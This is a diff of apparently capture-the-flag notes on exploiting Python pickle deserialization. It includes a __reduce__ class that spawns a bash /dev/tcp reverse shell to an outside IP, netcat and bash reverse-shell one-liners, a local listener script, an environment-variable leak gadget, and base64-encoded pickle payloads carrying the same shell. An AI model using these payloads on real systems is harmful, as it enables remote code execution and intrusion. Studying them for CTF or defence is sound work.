@@ -1,14 +1,11 @@
 # python string attack
 hint: deserialization
 
-
 1. normal post:
 ```py
 import pickle
 import requests
 import base64
-
-
 def normal_usage(debug=True):
     '''
     this gets accepted by the import api
@@ -34,10 +31,9 @@ def normal_usage(debug=True):
 
 
 
-2. how to listen to a port on windows
+2. how to listen to a port on windows(since windows doesn't have nc)
 ```py
 import socket, sys, time
-
 def listen(ip,port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((ip, port))
@@ -60,9 +56,14 @@ def listen(ip,port):
         sys.stdout.write("\033[A" + ans.split("\n")[-1])
 
 listen("127.0.0.1",8081)#port listen
-
 ```
 3. reverse shell payload
+```py
+class RCE_revers_shell:
+    def __reduce__(self):
+        cmd = "bash -c \"bash &>/dev/tcp/87.87.87.87/4444<&1\""
+        return os.system, (cmd,)
+```
 - if nc is available
 ```sh
 mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.25 9999 >/tmp/f
@@ -75,6 +76,13 @@ bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
 ```sh
 bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
 #this command starts a bash shell, then redirects stdout+stderr to the dest_ip:dest_port, then redirects the stdout into bash as input.
+```
+4. We can also use os.getenv to leak the flag, then use api/share to print it on screen.
+```py
+class RCE_get_env:
+    def __reduce__(self):
+        cmd="FLAG"
+        return os.getenv, (cmd,)
 ```
 # Footnotes:
 ##  file descriptor numbers
@@ -92,4 +100,18 @@ some_commnand < some_file
 ## Difference between “>” and “>>” in Linux
     - “>” overwrites an already existing file or a new file is created providing the mentioned file name isn’t there in the directory. 
     - “>>” operator appends an already present file or creates a new file if that file name doesn’t exist in the directory. 
-## How to enable /dev/tcp in bash?
+
+## Pickle does not cross OS
+- encoded payload looks different across linux and windows.
+
+```py
+#this is from a python in ubuntu
+#gASVcAAAAAAAAABdlH2UKIwCaWSUjAZoYWtvMDGUjARsZWZ0lE1rBIwDdG9wlIwFcG9zaXiUjAZzeXN0ZW2Uk5SMMGJhc2ggLWMgImJhc2ggJj4vZGV2L3RjcC8xNDAuMTE1LjU5LjE5NS80NDQ0PCYxIpSFlFKUdWEu
+#this is from python 3.10 in windows 10
+#gASVbQAAAAAAAABdlH2UKIwCaWSUjAZoYWtvMDGUjARsZWZ0lE1rBIwDdG9wlIwCbnSUjAZzeXN0ZW2Uk5SMMGJhc2ggLWMgImJhc2ggJj4vZGV2L3RjcC8xNDAuMTE1LjU5LjE5NS80NDQ0PCYxIpSFlFKUdWEu
+#this is from python 3.9 in windows 10
+#gASVbQAAAAAAAABdlH2UKIwCaWSUjAZoYWtvMDGUjARsZWZ0lE1rBIwDdG9wlIwCbnSUjAZzeXN0ZW2Uk5SMMGJhc2ggLWMgImJhc2ggJj4vZGV2L3RjcC8xNDAuMTE1LjU5LjE5NS80NDQ0PCYxIpSFlFKUdWEu
+#this is from wsl
+#gASVcAAAAAAAAABdlH2UKIwCaWSUjAZoYWtvMDGUjARsZWZ0lE1rBIwDdG9wlIwFcG9zaXiUjAZzeXN0ZW2Uk5SMMGJhc2ggLWMgImJhc2ggJj4vZGV2L3RjcC8xNDAuMTE1LjU5LjE5NS80NDQ0PCYxIpSFlFKUdWEu
+```
+ 
